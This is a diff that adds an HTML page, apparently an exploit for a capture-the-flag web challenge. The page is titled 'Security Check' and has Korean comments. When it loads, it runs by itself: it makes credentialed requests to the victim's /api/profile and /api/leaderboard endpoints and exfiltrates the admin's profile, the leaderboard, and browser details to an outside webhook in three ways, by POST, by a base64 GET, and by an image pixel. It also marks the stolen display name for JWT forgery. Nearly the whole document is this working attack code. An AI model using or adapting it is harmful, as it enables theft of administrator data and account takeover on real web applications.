@@ -1,30 +1,324 @@
-<script>
-async function findAdminInLeaderboard() {
-    try {
-        const leaderboardResp = await fetch('http://127.0.0.1:5555/api/leaderboard', {
-            credentials: 'include'
-        });
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            margin: 20px;
+            background-color: #f8f9fa;
+        }
+        .container { 
+            max-width: 600px; 
+            margin: 0 auto; 
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .loading { 
+            text-align: center; 
+            color: #666; 
+        }
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #007bff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status {
+            margin: 10px 0;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        .success { background-color: #d4edda; color: #155724; }
+        .error { background-color: #f8d7da; color: #721c24; }
+        .info { background-color: #d1ecf1; color: #0c5460; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Admin Information Extraction</h2>
+        <div class="loading">
+            <div class="spinner"></div>
+            <p>Extracting admin credentials...</p>
+        </div>
         
-        if (leaderboardResp.ok) {
-            const leaderboard = await leaderboardResp.json();
+        <div id="status-log"></div>
+        
+        <div id="complete" style="display:none;">
+            <div class="status success">
+                ✓ Admin information extracted successfully
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Configuration - 여러 가능한 서버 URL 시도
+        const POSSIBLE_URLS = [
+            'http://127.0.0.1:5555',
+            'http://localhost:5555',
+            'http://34.59.119.124:17005',
+            'http://flagguessr:5555'
+        ];
+        const WEBHOOK_URL = 'https://yreyehl.request.dreamhack.games';
+        
+        let statusLog = document.getElementById('status-log');
+        let workingBaseUrl = null;
+        
+        function addStatus(message, type = 'info') {
+            const div = document.createElement('div');
+            div.className = `status ${type}`;
+            div.textContent = `${new Date().toLocaleTimeString()} - ${message}`;
+            statusLog.appendChild(div);
+            console.log(`[${type.toUpperCase()}] ${message}`);
+        }
+        
+        async function sendToWebhook(data) {
+            const payload = {
+                timestamp: new Date().toISOString(),
+                source: 'admin_info_extraction',
+                page_url: window.location.href,
+                user_agent: navigator.userAgent,
+                extraction_data: data
+            };
             
-            // Admin- 으로 시작하는 사용자 찾기
-            const adminUsers = leaderboard.users.filter(user => 
-                user.username.startsWith('Admin-')
-            );
+            try {
+                // Method 1: POST request
+                const postResp = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload),
+                    mode: 'no-cors'
+                });
+                
+                // Method 2: GET request with base64 data
+                const base64Data = btoa(JSON.stringify(payload))
+                    .replace(/\+/g, '-')
+                    .replace(/\//g, '_')
+                    .replace(/=/g, '');
+                
+                await fetch(`${WEBHOOK_URL}?data=${base64Data}&t=${Date.now()}`, {
+                    method: 'GET',
+                    mode: 'no-cors'
+                });
+                
+                // Method 3: Image pixel tracking
+                const img = new Image();
+                img.src = `${WEBHOOK_URL}?img=1&admin=${encodeURIComponent(JSON.stringify(data))}&t=${Date.now()}`;
+                
+                addStatus('Admin data sent to webhook', 'success');
+                return true;
+            } catch (error) {
+                addStatus(`Webhook failed: ${error.message}`, 'error');
+                return false;
+            }
+        }
+        
+        async function findWorkingUrl() {
+            addStatus('Testing server connectivity...', 'info');
             
-            await fetch('https://dvgkpfj.request.dreamhack.games', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    type: 'admin_users_found',
-                    admins: adminUsers
-                }),
-                mode: 'no-cors'
+            for (const baseUrl of POSSIBLE_URLS) {
+                try {
+                    addStatus(`Testing ${baseUrl}...`, 'info');
+                    
+                    // 간단한 연결 테스트
+                    const testResp = await fetch(`${baseUrl}/api/profile`, {
+                        method: 'GET',
+                        credentials: 'include',
+                        timeout: 5000
+                    });
+                    
+                    // 응답이 있으면 (성공이든 실패든) 서버가 살아있음
+                    if (testResp.status >= 200 && testResp.status < 500) {
+                        workingBaseUrl = baseUrl;
+                        addStatus(`✅ Found working server: ${baseUrl}`, 'success');
+                        return baseUrl;
+                    }
+                } catch (e) {
+                    addStatus(`❌ ${baseUrl} failed: ${e.message}`, 'error');
+                }
+            }
+            
+            addStatus('⚠️ No working server found, using default', 'error');
+            return POSSIBLE_URLS[0]; // 기본값
+        }
+        
+        async function extractAdminInfo() {
+            try {
+                addStatus('🚀 Starting admin information extraction...', 'info');
+                
+                // 1. 서버 URL 찾기
+                const baseUrl = await findWorkingUrl();
+                
+                const extractedData = {
+                    extraction_started: true,
+                    working_server: baseUrl,
+                    steps: [],
+                    admin_info: {}
+                };
+                
+                // 2. Admin Profile 추출
+                try {
+                    addStatus('📋 Step 1: Extracting admin profile...', 'info');
+                    const profileResp = await fetch(`${baseUrl}/api/profile`, {
+                        credentials: 'include'
+                    });
+                    
+                    if (profileResp.ok) {
+                        const adminProfile = await profileResp.json();
+                        extractedData.admin_info.profile = adminProfile;
+                        extractedData.steps.push('profile_extracted');
+                        
+                        addStatus(`✅ Admin Profile Found!`, 'success');
+                        addStatus(`👤 Username: ${adminProfile.username || 'unknown'}`, 'info');
+                        addStatus(`🆔 User ID: ${adminProfile.user_id || 'unknown'}`, 'info');
+                        addStatus(`📛 Display Name: ${adminProfile.display_name || 'unknown'}`, 'info');
+                        addStatus(`🔑 User Kind: ${adminProfile.user_kind === 1 ? 'ADMIN' : 'USER'}`, 'info');
+                        
+                        // 즉시 웹훅으로 전송
+                        await sendToWebhook({
+                            type: 'ADMIN_PROFILE_EXTRACTED',
+                            admin_profile: adminProfile,
+                            extraction_time: new Date().toISOString()
+                        });
+                        
+                    } else {
+                        extractedData.steps.push('profile_failed');
+                        addStatus(`❌ Profile extraction failed: ${profileResp.status}`, 'error');
+                    }
+                } catch (e) {
+                    extractedData.steps.push(`profile_error: ${e.message}`);
+                    addStatus(`❌ Profile error: ${e.message}`, 'error');
+                }
+                
+                // 3. Leaderboard에서 추가 정보 수집
+                try {
+                    addStatus('📊 Step 2: Checking leaderboard...', 'info');
+                    const leaderboardResp = await fetch(`${baseUrl}/api/leaderboard`, {
+                        credentials: 'include'
+                    });
+                    
+                    if (leaderboardResp.ok) {
+                        const leaderboardData = await leaderboardResp.json();
+                        extractedData.admin_info.leaderboard = leaderboardData;
+                        extractedData.steps.push('leaderboard_extracted');
+                        
+                        // Admin 사용자들 찾기
+                        const adminUsers = leaderboardData.users?.filter(user => 
+                            user.username?.startsWith('Admin-') || 
+                            user.user_id === extractedData.admin_info.profile?.user_id
+                        ) || [];
+                        
+                        addStatus(`📈 Leaderboard extracted: ${leaderboardData.users?.length || 0} users`, 'success');
+                        addStatus(`👑 Found ${adminUsers.length} admin users`, 'info');
+                        
+                        await sendToWebhook({
+                            type: 'LEADERBOARD_DATA',
+                            leaderboard: leaderboardData,
+                            admin_users: adminUsers
+                        });
+                        
+                    } else {
+                        extractedData.steps.push('leaderboard_failed');
+                        addStatus(`❌ Leaderboard failed: ${leaderboardResp.status}`, 'error');
+                    }
+                } catch (e) {
+                    extractedData.steps.push(`leaderboard_error: ${e.message}`);
+                    addStatus(`❌ Leaderboard error: ${e.message}`, 'error');
+                }
+                
+                // 4. 환경 정보 수집
+                try {
+                    addStatus('🌐 Step 3: Collecting environment info...', 'info');
+                    const envInfo = {
+                        user_agent: navigator.userAgent,
+                        page_url: window.location.href,
+                        referrer: document.referrer,
+                        timestamp: new Date().toISOString(),
+                        screen_resolution: `${screen.width}x${screen.height}`,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                    };
+                    
+                    extractedData.admin_info.environment = envInfo;
+                    extractedData.steps.push('environment_collected');
+                    
+                    addStatus('🌐 Environment info collected', 'success');
+                } catch (e) {
+                    addStatus(`❌ Environment collection error: ${e.message}`, 'error');
+                }
+                
+                // 5. 최종 데이터 전송
+                addStatus('📤 Step 4: Sending final extraction data...', 'info');
+                await sendToWebhook({
+                    type: 'COMPLETE_EXTRACTION',
+                    complete_data: extractedData,
+                    summary: {
+                        admin_username: extractedData.admin_info.profile?.username,
+                        admin_user_id: extractedData.admin_info.profile?.user_id,
+                        admin_display_name: extractedData.admin_info.profile?.display_name,
+                        admin_user_kind: extractedData.admin_info.profile?.user_kind,
+                        total_steps: extractedData.steps.length,
+                        successful_steps: extractedData.steps.filter(s => !s.includes('error') && !s.includes('failed')).length
+                    }
+                });
+                
+                // 완료 표시
+                document.querySelector('.loading').style.display = 'none';
+                document.getElementById('complete').style.display = 'block';
+                addStatus('🎉 Admin information extraction completed!', 'success');
+                
+                // JWT 생성 가이드 표시
+                if (extractedData.admin_info.profile?.display_name) {
+                    addStatus('💡 Use this display_name for JWT forgery!', 'info');
+                    addStatus(`🔧 Display Name: ${extractedData.admin_info.profile.display_name}`, 'success');
+                }
+                
+            } catch (error) {
+                addStatus(`💥 Critical extraction error: ${error.message}`, 'error');
+                await sendToWebhook({
+                    type: 'EXTRACTION_ERROR',
+                    error: error.message,
+                    stack: error.stack,
+                    timestamp: new Date().toISOString()
+                });
+            }
+        }
+        
+        // 페이지 로드 시 추출 시작
+        window.onload = function() {
+            addStatus('🌟 Admin extraction page loaded', 'info');
+            addStatus('⏱️ Starting extraction in 2 seconds...', 'info');
+            setTimeout(extractAdminInfo, 2000);
+        };
+        
+        // 문서 준비 시에도 시도
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', function() {
+                setTimeout(extractAdminInfo, 3000);
             });
         }
-    } catch (e) {
-        console.log('Failed to get leaderboard:', e);
-    }
-}
-</script>
+        
+        // 추가 안전장치: 5초 후 강제 실행
+        setTimeout(() => {
+            if (!document.getElementById('complete').style.display || 
+                document.getElementById('complete').style.display === 'none') {
+                addStatus('🔄 Backup extraction trigger...', 'info');
+                extractAdminInfo();
+            }
+        }, 5000);
+    </script>
+</body>
+</html>
